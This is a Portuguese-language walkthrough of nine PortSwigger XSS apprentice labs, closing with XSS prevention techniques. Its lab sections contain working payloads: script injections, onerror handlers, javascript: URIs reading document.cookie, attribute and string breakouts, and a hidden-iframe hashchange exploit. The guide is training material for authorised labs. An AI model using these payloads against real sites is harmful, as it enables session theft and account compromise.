<!-- ===================================== -->
<!--        XSS SECURITY FIELD GUIDE       -->
<!-- ===================================== -->

<p align="center">
  <img src="https://img.shields.io/badge/Vulnerability-Cross--Site%20Scripting-black?style=for-the-badge">
  <img src="https://img.shields.io/badge/Focus-Web%20Exploitation%20%7C%20Browser%20Security-darkred?style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Category-Web%20Security-red?style=flat-square">
  <img src="https://img.shields.io/badge/Attack%20Surface-Browser%20DOM-orange?style=flat-square">
  <img src="https://img.shields.io/badge/Technique-XSS%20Injection-yellow?style=flat-square">
  <img src="https://img.shields.io/badge/Platform-PortSwigger-blue?style=flat-square">
  <img src="https://img.shields.io/badge/Level-Apprentice%20%E2%86%92%20Intermediate-green?style=flat-square">
</p>

---

# 🕷️ Cross-Site Scripting (XSS)
## Guia Técnico de Exploração, Contextos de Injeção e Segurança no Navegador

> Aplicações web modernas dependem constantemente de entradas fornecidas por usuários:
>
> pesquisas, comentários, formulários, parâmetros de URL, APIs e interações em tempo real.
>
> Quando esses dados são processados sem validação adequada, o navegador deixa de interpretar apenas conteúdo — e passa a executar código controlado pelo atacante.
>
> Esse é o núcleo do **Cross-Site Scripting (XSS)**:
>
> a capacidade de transformar entrada não confiável em execução arbitrária de JavaScript no contexto da vítima.

---

## 🛡️ Perspectiva de Segurança Ofensiva

Durante a exploração de XSS, o analista deve pensar como:

- Um atacante → identificando contextos de execução
- Um navegador → interpretando HTML e JavaScript
- Um desenvolvedor → entendendo erros de sanitização
- Um threat hunter → detectando padrões de exploração
- Um engenheiro defensivo → mitigando superfícies vulneráveis

Perguntas fundamentais incluem:

- Onde a entrada do usuário é refletida?
- O contexto é HTML, atributo ou JavaScript?
- Existe encoding parcial?
- O payload precisa escapar de aspas?
- O navegador executará tags `<script>`?
- Eventos HTML podem ser abusados?
- O DOM está sendo manipulado de forma insegura?
- Há sinks perigosos como `innerHTML` ou `eval()`?

---

## 🧪 Ambiente de Laboratório

Os laboratórios utilizados neste guia são baseados na plataforma:

- PortSwigger Web Security Academy
- Burp Suite Community Edition
- Navegadores modernos com DevTools
- Ambientes controlados para exploração segura

Ferramentas utilizadas incluem:

- Burp Suite
- Firefox DevTools
- Chrome DevTools
- XSS Hunter
- OWASP ZAP
- BeEF Framework

---

## ⚠️ Aviso Ético

> Todo o conteúdo apresentado neste documento possui finalidade exclusivamente educacional.
>
> As técnicas demonstradas devem ser utilizadas apenas em:
>
> - laboratórios autorizados
> - ambientes controlados
> - programas de treinamento
> - plataformas legais de aprendizado
>
> A exploração de vulnerabilidades sem autorização explícita é ilegal e antiética.

---
# PortSwigger Web Security Academy — XSS Apprentice Labs

## 1. Introdução ao Cross-Site Scripting (XSS)

### O que é XSS?

*Cross-Site Scripting* (XSS) é uma vulnerabilidade de segurança que permite a atacantes injetar scripts maliciosos em páginas web visualizadas por outros usuários. Esses scripts são executados no contexto do navegador da vítima, possibilitando que o atacante roube cookies de sessão, capture credenciais ou execute ações arbitrárias em nome do usuário — sem que ele perceba.

![](assets/Pasted%20image%2020251029212631.png)

### Como funciona o XSS?

O XSS ocorre quando uma aplicação web:

- Recebe dados não confiáveis fornecidos pelo usuário;
- Processa esses dados sem validação adequada;
- Devolve esses dados ao navegador sem sanitização, permitindo que sejam interpretados como código.

O ponto central da vulnerabilidade é a **ausência de distinção entre dados e código**: quando o navegador recebe um dado que contém HTML ou JavaScript, ele simplesmente o executa.

### Tipos de XSS

Existem três categorias principais de XSS, cada uma com um mecanismo distinto de entrega e persistência do payload.

**1. Reflected XSS**
O script malicioso é incluído na requisição e imediatamente refletido na resposta do servidor. O ataque geralmente é distribuído por meio de links forjados enviados à vítima.

![](assets/Pasted%20image%2020251029212939.png)

**2. Stored XSS**
O script é armazenado persistentemente no servidor (ex.: banco de dados) e executado sempre que qualquer usuário acessa a página infectada. É considerado o tipo mais perigoso, pois não depende que a vítima clique em um link.

![](assets/Pasted%20image%2020251029213028.png)

**3. DOM-based XSS**
A vulnerabilidade reside inteiramente no código JavaScript do lado do cliente. O servidor entrega uma página legítima, mas o JavaScript da própria página manipula o DOM de forma insegura com dados controláveis pelo atacante.

![](assets/Pasted%20image%2020251029213057.png)

---

## 2. Configuração do Ambiente

Antes de iniciar os laboratórios, configure um ambiente adequado para testes de segurança.

### Navegadores Recomendados

- **Burp Suite Browser** — integrado com o Burp Suite, ideal para interceptação
- **Mozilla Firefox** — compatível com diversas extensões de segurança
- **Google Chrome** com DevTools — útil para análise de código e DOM

### Extensões Úteis

- **Cookie Editor** — para visualização e manipulação de cookies de sessão
- **Hack-Tools** — conjunto de utilidades para testes de segurança
- **XSS Hunter** — ferramenta para detecção e rastreamento de XSS cego

### Ferramentas de Teste

- **Burp Suite** (Community ou Professional) — proxy de interceptação e análise de tráfego HTTP
- **OWASP ZAP** — scanner de vulnerabilidades open source
- **XSS Strike** — ferramenta automatizada de detecção e exploração de XSS
- **BeEF** (Browser Exploitation Framework) — framework para exploração de vulnerabilidades no navegador

> **Dica:** Para os laboratórios do PortSwigger, o Burp Suite Community Edition é suficiente. Certifique-se de configurar o proxy do navegador para apontar para `127.0.0.1:8080`.

---

## 3. Resolução dos Laboratórios PortSwigger — Nível Apprentice

Os laboratórios a seguir são da plataforma **Web Security Academy** do PortSwigger e cobrem os vetores de ataque XSS mais comuns. Cada laboratório apresenta um cenário realista com uma vulnerabilidade intencional para fins educacionais.

---

### Laboratório 1: Reflected XSS em Contexto HTML

**Objetivo:** Executar um alerta usando `alert()` através de um parâmetro de URL.

**Passo a passo:**

**1.** Acesse o laboratório.

![](assets/Pasted%20image%2020251029213457.png)

**2.** Localize a barra de pesquisa e realize uma busca qualquer (ex.: `teste`). Observe que o valor digitado é refletido diretamente na página:

![](assets/Pasted%20image%2020251029214258.png)

```html
<!-- Antes da busca -->
<div class="search-message">Digite sua busca</div>

<!-- Depois de buscar por "teste" -->
<div class="search-results">
    <h1>Resultados para: teste</h1>
    <p>Você pesquisou por: <strong>teste</strong></p>
</div>
```

Note que `teste` foi **refletido em dois lugares**: no `<h1>` e no `<strong>`. Isso indica que a entrada do usuário é inserida diretamente no HTML sem sanitização.

**3.** Injete uma tag `<script>` no campo de busca:

```html
<script>alert('XSS')</script>
```

Como a aplicação não filtra tags HTML, o script é interpretado pelo navegador e o alerta é exibido:

![](assets/Pasted%20image%2020251029214815.png)

**Por que funciona?** A aplicação recebe a entrada do usuário e a insere no HTML da resposta sem verificar se ela contém código. O navegador, ao receber a página, executa o `<script>` normalmente.

---

### Laboratório 2: Stored XSS em Comentários

**Objetivo:** Postar um comentário contendo `alert()` que seja executado automaticamente ao carregar a página.

**Passo a passo:**

**1.** Navegue até qualquer postagem do blog e acesse a seção de comentários.

![](assets/Pasted%20image%2020251029215228.png)

![](assets/Pasted%20image%2020251029215256.png)

**2.** No campo de comentário, insira o payload:

```html
<script>alert('XSS')</script>
```

![](assets/Pasted%20image%2020251029215454.png)

**3.** Envie o comentário e recarregue a página.

O alerta será disparado automaticamente:

![](assets/Pasted%20image%2020251029215648.png)

**Por que funciona?** Diferentemente do Reflected XSS, aqui o payload é **armazenado no banco de dados** do servidor. A cada carregamento da página, o servidor recupera o comentário e o insere no HTML — executando o script para qualquer usuário que visualize a página, não apenas para quem enviou o payload.

---

### Laboratório 3: DOM XSS em Sink de Escrita (`document.write`)

**Objetivo:** Explorar uma vulnerabilidade DOM-based XSS onde dados da URL são escritos diretamente no DOM.

**Passo a passo:**

**1.** Realize uma busca qualquer na barra de pesquisa.

**2.** Abra as ferramentas de desenvolvedor (`F12` ou `Ctrl+Shift+C`) e analise o código JavaScript da página.

**3.** Identifique onde os parâmetros da URL são processados pelo JavaScript:

![](assets/Pasted%20image%2020251119212520.png)

Você verá um padrão similar a este:

```javascript
// Código vulnerável típico
var query = new URLSearchParams(window.location.search).get('search');
document.write('<p>Você pesquisou por: ' + query + '</p>');
```

**4.** Injete o seguinte payload na barra de busca:

```html
"><img src=x onerror=alert('XSS')>
```

![](assets/Pasted%20image%2020251119212809.png)

**Por que funciona?** O JavaScript extrai o valor do parâmetro `search` da URL e o passa diretamente para `document.write()` sem qualquer sanitização. As aspas `"` e `>` encerram o contexto HTML anterior, e a tag `<img>` com `onerror` dispara o JavaScript quando o navegador falha ao carregar a imagem inexistente (`src=x`).

> **Diferença-chave em relação ao Reflected XSS:** O servidor entrega uma página aparentemente normal. A vulnerabilidade está 100% no JavaScript do cliente, que manipula o DOM de forma insegura.

---

### Laboratório 4: XSS via Atributo `innerHTML`

**Objetivo:** Usar atributos HTML para executar JavaScript em um contexto onde a entrada é inserida via `innerHTML`.

**Passo a passo:**

**1.** Localize o campo de pesquisa e realize uma busca para observar o comportamento.

Exemplos de como atributos HTML podem ser vetores de ataque:

```html
<!-- Exemplo de estruturas vulneráveis -->
<input type="text" value="ENTRADA_DO_USUÁRIO_AQUI">
<img src="ENTRADA_DO_USUÁRIO_AQUI">
<div class="ENTRADA_DO_USUÁRIO_AQUI">
```

**2.** Ao inspecionar o código-fonte, você identificará algo como:

```javascript
var query = new URLSearchParams(window.location.search).get('search');
document.getElementById('resultado').innerHTML = query;
```

![](assets/Pasted%20image%2020251119213644.png)

O valor do parâmetro `search` é inserido diretamente via `innerHTML` **sem validação ou sanitização**, o que permite que qualquer HTML ou JavaScript fornecido pelo usuário seja interpretado pelo navegador.

**3.** Injete o payload:

```html
<img src=x onerror=alert('XSS')>
```

**Por que funciona?** A propriedade `innerHTML` interpreta a string como HTML. Ao definir `src=x` (valor inexistente), o navegador tenta carregar a imagem, falha, e dispara o evento `onerror`, executando `alert('XSS')`.

> **Nota técnica:** Diferente do `document.write`, `innerHTML` não executa tags `<script>` diretamente. Por isso, usamos eventos como `onerror` para contornar essa limitação.

---

### Laboratório 5: XSS em URLs — Injeção via Parâmetro `returnPath`

**Objetivo:** Injetar um payload XSS através de um parâmetro de URL que é refletido em um atributo `href`.

**Passo a passo:**

**1.** Navegue até a página `Submit Feedback`. Observe que a URL contém um parâmetro como:

```
https://lab-id.web-security-academy.net/feedback?returnPath=/
```

![](assets/Pasted%20image%2020251119215149.png)

**2.** Altere o valor do parâmetro `returnPath` para `teste` e inspecione o código-fonte com as ferramentas de desenvolvedor. Você verá que o valor foi inserido no atributo `href` de um link:

```html
<a href="teste">« Back</a>
```

![](assets/Pasted%20image%2020251119215334.png)

**3.** Substitua o valor do parâmetro pelo payload:

```
javascript:alert(document.cookie)
```

URL completa:

```
https://lab-id.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
```

**4.** Acesse a URL modificada e clique no link `« Back`. O alerta será disparado.

**Por que funciona?** O valor do parâmetro `returnPath` é inserido diretamente no atributo `href` sem validação do protocolo. O esquema `javascript:` é um URI válido que, ao ser usado como destino de um link, faz o navegador executar o código JavaScript quando o usuário clica.

> **Impacto real:** Neste exemplo, `document.cookie` expõe os cookies da sessão da vítima. Em um ataque real, esse valor poderia ser enviado para o servidor do atacante via uma requisição HTTP.

---

### Laboratório 6: DOM XSS via Seletor jQuery com Evento `hashchange`

**Objetivo:** Explorar uma vulnerabilidade DOM XSS onde o valor da âncora (`#`) é inserido sem sanitização no seletor `:contains()` do jQuery, e usar o evento `hashchange` para acionar a execução do payload.

**Passo a passo:**

**1.** Acesse a página inicial do laboratório — um blog simples que utiliza navegação por âncoras.

**2.** Abra as ferramentas de desenvolvedor (`F12`) e analise o JavaScript. Você encontrará um trecho similar a este:

```javascript
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```

**3.** Esse código extrai o valor após o `#` na URL e o insere diretamente no seletor jQuery `:contains()` **sem sanitização alguma**. Um valor malicioso quebra o contexto do seletor e permite injetar HTML.

**4.** O payload a ser usado:

```text
#<img src=x onerror=alert('XSS')>
```

URL completa:

```text
https://lab-id.web-security-academy.net/#<img src=x onerror=alert('XSS')>
```

**5. Por que o alerta não dispara imediatamente?**

O evento `hashchange` só é acionado quando o hash muda *enquanto a página já está carregada*. Acessar a URL com o payload não dispara o evento, pois a página carrega com o hash já definido. É necessário **forçar a mudança do hash após o carregamento**.

**6.** No servidor de exploit fornecido pelo PortSwigger, clique em **"Go to exploit server"** e insira o seguinte código no campo `Body`:

```html
<iframe 
    src="https://lab-id.web-security-academy.net/#" 
    onload="this.src += '<img src=x onerror=print()>'"
    hidden="hidden">
</iframe>
```

![](assets/Pasted%20image%2020260518144836.png)

**Como funciona o exploit:**

- O `iframe` carrega a página vulnerável com hash vazio (`#`)
- Quando o carregamento termina, o evento `onload` é disparado
- O JavaScript adiciona o payload ao `src` do `iframe`
- Isso provoca uma mudança no hash, acionando o evento `hashchange`
- O jQuery processa o valor malicioso e o `print()` é executado

**Payload alternativo (para teste com `alert`):**

```html
<iframe 
    src="https://lab-id.web-security-academy.net/#" 
    onload="this.src += '<img src=erro onerror=alert(document.cookie)>'"
    hidden="hidden">
</iframe>
```

**7.** Clique em **"View exploit"** para verificar se o `print()` é acionado corretamente:

![](assets/Pasted%20image%2020260518145004.png)

**8.** Clique em **"Deliver exploit to victim"** para concluir o laboratório.

---

### Laboratório 7: Reflected XSS em Atributo com Colchetes Angulares Codificados em HTML

**Objetivo:** Explorar XSS refletido onde `<` e `>` são codificados em HTML. A proteção impede a injeção de novas tags, mas não a injeção de atributos dentro de tags existentes.

**Contexto da vulnerabilidade:**

A aplicação codifica `<` e `>` como `&lt;` e `&gt;`, bloqueando a injeção de novas tags HTML. Porém, as **aspas duplas (`"`) não são codificadas**, o que permite fechar o atributo atual e adicionar novos atributos — incluindo manipuladores de eventos JavaScript.

**Passo a passo:**

**1.** Realize uma busca com um valor alfanumérico simples:

```
xss123
```

**2.** No Burp Suite, intercepte a requisição e envie ao **Burp Repeater** (`Ctrl+R`).

**3.** Analise a resposta. Você verá sua entrada refletida no atributo `value` de um campo `<input>`:

```html
<input type="text" placeholder="Search the blog..." name="search" value="xss123">
```

![](assets/Pasted%20image%2020260518171557.png)

**4.** Confirme a codificação enviando `<script>alert(1)</script>`. Na resposta:

```html
value="&lt;script&gt;alert(1)&lt;/script&gt;"
```

![](assets/Pasted%20image%2020260518171804.png)

Tags bloqueadas — mas aspas duplas continuam funcionando.

**5.** Monte o payload aproveitando que as aspas não são sanitizadas:

```
"onmouseover="alert(1)
```

O HTML resultante será:

```html
<input type="text" placeholder="Search the blog..." name="search" value=""onmouseover="alert(1)">
```

**O que aconteceu:**
- A primeira `"` fecha o atributo `value`
- `onmouseover=` injeta um novo atributo manipulador de eventos
- `alert(1)` é o código executado quando o mouse passa sobre o campo
- A `"` final (original da tag) fecha o novo atributo

**6.** Acesse a URL com o payload no navegador usando um dos métodos abaixo:

- **Método direto:** Cole o payload na barra de pesquisa
- **Via URL:** `https://lab-id.web-security-academy.net/?search="onmouseover="alert(1)`
- **Via Burp:** No Repeater, clique com botão direito → "Copy URL"

**7.** Passe o mouse sobre o campo de busca. O alerta será acionado:

![](assets/Pasted%20image%2020260518172206.png)

---

### Laboratório 8: Stored XSS em Atributo `href` com Aspas Duplas Codificadas em HTML

**Objetivo:** Explorar XSS armazenado no campo "Website" dos comentários, onde o valor é refletido no atributo `href` de um link. As aspas duplas são codificadas, mas um URI `javascript:` pode ser injetado diretamente.

**Contexto da vulnerabilidade:**

O campo "Website" do formulário de comentários é armazenado e exibido como `href` no nome do autor. Aspas duplas são convertidas para `&quot;`, impedindo que você escape do atributo. Porém, é possível injetar `javascript:` diretamente como valor do `href`.

**Passo a passo:**

#### Parte 1 — Entendendo o fluxo

**1.** Acesse qualquer postagem do blog e localize a seção de comentários.

**2.** Preencha o formulário de comentário com dados de teste:

| Campo   | Valor              |
| ------- | ------------------ |
| Name    | `test`             |
| Email   | `teste@test.com`   |
| Website | `xss123`           |
| Comment | `Comentário teste` |

![](assets/Pasted%20image%2020260518174729.png)

#### Parte 2 — Identificando a reflexão

**3.** Após enviar, recarregue a página e inspecione o código-fonte. Você verá:

```html
<a id="author" href="xss123">test</a>
```

Sua entrada `xss123` foi refletida dentro do atributo `href`.

#### Parte 3 — Construindo o payload

**5.** No campo "Website", insira:

```javascript
javascript:alert(1)
```

Ou para demonstrar roubo de cookies:

```javascript
javascript:alert(document.cookie)
```

**6.** Envie o comentário. Na resposta, o HTML gerado será:

```html
<a id="author" href="javascript:alert(1)">test</a>
```

#### Parte 4 — Testando o exploit

**7.** Recarregue a página e **clique no nome do autor**. O alerta será exibido:

![[Pasted image 20260518175405.png]]

**Por que funciona?** O protocolo `javascript:` em um atributo `href` instrui o navegador a executar o código JavaScript ao invés de navegar para uma URL. Como a aplicação não valida o protocolo do link, qualquer valor incluindo `javascript:` é aceito e armazenado.

---

### Laboratório 9: Reflected XSS em String JavaScript com Colchetes Angulares Codificados

**Objetivo:** Explorar XSS refletido onde a entrada é inserida dentro de uma string JavaScript. Os caracteres `<` e `>` são codificados, mas as **aspas simples (`'`) não são** — o que permite escapar da string e injetar código.

**Contexto da vulnerabilidade:**

A reflexão ocorre dentro de um bloco `<script>`:

```javascript
var searchTerm = 'SUA_ENTRADA_AQUI';
document.write('<p>Resultados para: ' + searchTerm + '</p>');
```

**Passo a passo:**

**1.** Realize uma busca com `teste123`. Intercepte a requisição com o Burp Suite e envie ao **Repeater**:

```http
GET /?search=teste123 HTTP/1.1
Host: lab-id.web-security-academy.net
```

**2.** Na resposta, localize a reflexão no JavaScript:

```html
<script>
    var searchTerm = 'teste123';
    document.write('<p>Resultados para: ' + searchTerm + '</p>');
</script>
```

**3.** Confirme que `<` e `>` são bloqueados enviando `<script>alert(1)</script>`:

```javascript
var searchTerm = '&lt;script&gt;alert(1)&lt;/script&gt;';
```

Tags bloqueadas — mas aspas simples não são sanitizadas.

**4.** Monte o payload para escapar da string JavaScript e injetar código:

```javascript
';alert(1)//
```

**O código resultante será:**

```javascript
var searchTerm = '';alert(1)//'
```

**Anatomia do payload:**

| Caractere | Função |
|-----------|--------|
| `'`       | Fecha a string original |
| `;`       | Termina a instrução `var` |
| `alert(1)`| Código JavaScript injetado |
| `//`      | Comenta o restante da linha (a aspa `'` original) |

**5.** Compare os payloads disponíveis:

| Payload | Resultado no JavaScript | Funciona? |
|---------|------------------------|-----------|
| `'-alert(1)-'` | `''-alert(1)-''` | ✅ Sim |
| `';alert(1);'` | `'';alert(1);''` | ✅ Sim |
| `';alert(1)//` | `'';alert(1)//'` | ✅ Sim (mais limpo) |
| `';alert(document.cookie)//` | `'';alert(document.cookie)//'` | ✅ Sim |

**6.** Acesse a URL com o payload no navegador:

```
https://lab-id.web-security-academy.net/?search=';alert(1)//
```

O alerta será acionado automaticamente no carregamento da página.

**Visão completa do ataque:**

```html
<!-- Código original vulnerável -->
<script>
    var searchTerm = 'CONTEÚDO_DO_USUÁRIO';
    document.write('<p>Resultados para: ' + searchTerm + '</p>');
</script>

<!-- Após injeção de ';alert(1)// -->
<script>
    var searchTerm = '';alert(1)//'
    document.write('<p>Resultados para: ' + searchTerm + '</p>');
</script>
```

O navegador executa: `var searchTerm = '';` → `alert(1)` → o restante é comentado.

---

## 4. Técnicas de Prevenção

Entender como prevenir o XSS é tão importante quanto saber como explorá-lo. A seguir, as principais defesas.

### 4.1 Validação e Sanitização de Entrada

**Nunca confie em dados fornecidos pelo usuário.** Valide o tipo, formato e tamanho de toda entrada antes de processá-la.

```python
# Exemplo em Python com bleach (biblioteca de sanitização HTML)
import bleach

entrada_usuario = '<script>alert("XSS")</script>'
entrada_segura = bleach.clean(entrada_usuario)
# Resultado: '&lt;script&gt;alert("XSS")&lt;/script&gt;'
```

### 4.2 Codificação de Saída (Output Encoding)

O dado deve ser **codificado de acordo com o contexto** onde será inserido. Não existe uma codificação universal.

| Contexto de inserção | Técnica de codificação |
|----------------------|------------------------|
| HTML (corpo da página) | HTML encoding (`<` → `&lt;`) |
| Atributo HTML | Attribute encoding |
| JavaScript (string) | JavaScript encoding |
| URL | URL encoding (`%3C` para `<`) |
| CSS | CSS encoding |

```javascript
// JavaScript — uso seguro com textContent em vez de innerHTML
const query = new URLSearchParams(window.location.search).get('search');
document.getElementById('resultado').textContent = query; // Seguro
// document.getElementById('resultado').innerHTML = query; // Vulnerável
```

### 4.3 Content Security Policy (CSP)

O CSP é um cabeçalho HTTP que instrui o navegador a executar apenas scripts de fontes confiáveis, mitigando o impacto de XSS mesmo que ele ocorra.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.confiavel.com
```

Essa política bloqueia a execução de scripts inline e de origens não listadas.

### 4.4 Cookies com Flag `HttpOnly`

Cookies marcados com `HttpOnly` não podem ser acessados via JavaScript, impedindo que um XSS os roube.

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

### 4.5 Uso de Frameworks Seguros

Frameworks modernos como React, Angular e Vue aplicam escaping automático ao renderizar variáveis. Prefira as APIs seguras:

```javascript
// React — seguro por padrão
const App = ({ userInput }) => <p>{userInput}</p>;

// Evite dangerouslySetInnerHTML a menos que seja absolutamente necessário
// const App = ({ userInput }) => <p dangerouslySetInnerHTML={{__html: userInput}} />;
```

---

## 5. Conclusão

Ao longo desta documentação, exploramos o Cross-Site Scripting de forma progressiva — partindo da teoria, passando pelos três tipos fundamentais (Reflected, Stored e DOM-based), e chegando à resolução prática de nove laboratórios de nível *Apprentice* do PortSwigger Web Security Academy.

Cada laboratório revelou uma faceta diferente do XSS:

- Os **Laboratórios 1 e 2** demonstraram as formas mais diretas de injeção: via reflexão imediata e via armazenamento persistente, respectivamente.
- Os **Laboratórios 3 e 4** evidenciaram como o JavaScript do lado cliente pode ser tão perigoso quanto o servidor, especialmente com APIs como `document.write` e `innerHTML`.
- Os **Laboratórios 5 e 8** mostraram vetores menos óbvios: atributos `href` e parâmetros de URL que aceitam o esquema `javascript:`.
- O **Laboratório 6** introduziu a exploração de bibliotecas de terceiros (jQuery) e a necessidade de entender o ciclo de vida de eventos do navegador para montar exploits mais sofisticados.
- Os **Laboratórios 7 e 9** ilustraram como proteções parciais — como codificar apenas `<` e `>` — podem ser insuficientes quando outros caracteres (aspas, ponto-e-vírgula) não são tratados.

**O padrão que une todos os casos é sempre o mesmo:** dados controlados pelo usuário são inseridos em um contexto de execução sem separação adequada entre dado e código.

A compreensão prática do XSS é essencial para qualquer profissional de segurança da informação. Saber como um atacante pensa e age é o que torna possível construir defesas eficazes — aplicando output encoding contextual, políticas de CSP robustas, flags de segurança em cookies e APIs seguras dos frameworks modernos.

> **Lembrete ético:** As técnicas apresentadas aqui têm finalidade exclusivamente educacional e devem ser praticadas apenas em ambientes controlados e autorizados, como os laboratórios do PortSwigger. O uso dessas técnicas sem autorização em sistemas reais é ilegal e antiético.

